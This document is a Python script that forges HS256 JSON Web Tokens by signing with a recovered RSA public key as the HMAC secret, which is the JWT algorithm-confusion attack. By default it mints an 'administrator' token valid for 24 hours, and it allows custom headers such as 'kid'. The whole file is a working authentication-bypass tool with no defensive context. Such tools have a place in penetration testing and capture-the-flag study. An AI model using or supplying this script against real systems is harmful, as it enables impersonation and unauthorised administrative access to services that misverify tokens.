#!/usr/bin/env python3
import sys
import argparse
import base64
import hmac
import hashlib
import json
import time


def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def forge(pem: bytes, header: dict, payload: dict) -> str:
    h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = h_b64 + b"." + p_b64
    sig = hmac.new(pem, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64url(sig)).decode()


def main():
    parser = argparse.ArgumentParser(
        description="Forge a HS256 JWT using a recovered RSA public key as HMAC secret.",
        epilog="Example: forge_from_pem.py key.pem --payload '{\"sub\":\"admin\"}'"
    )
    parser.add_argument("pem", help="Path to PEM file (x509 or pkcs1)")
    parser.add_argument(
        "--payload", "-p",
        help='JSON payload (default: {"sub":"administrator","exp":<+24h>})',
        default=None
    )
    parser.add_argument(
        "--header", "-H",
        help='JSON header overrides, merged with {"alg":"HS256"} (e.g. \'{"kid":"abc"}\')',
        default="{}"
    )
    args = parser.parse_args()

    with open(args.pem, "rb") as f:
        pem = f.read()

    header = {"alg": "HS256"}
    header.update(json.loads(args.header))

    if args.payload:
        payload = json.loads(args.payload)
    else:
        payload = {"sub": "administrator", "exp": int(time.time()) + 86400}

    token = forge(pem, header, payload)
    print(token)


if __name__ == "__main__":
    main()
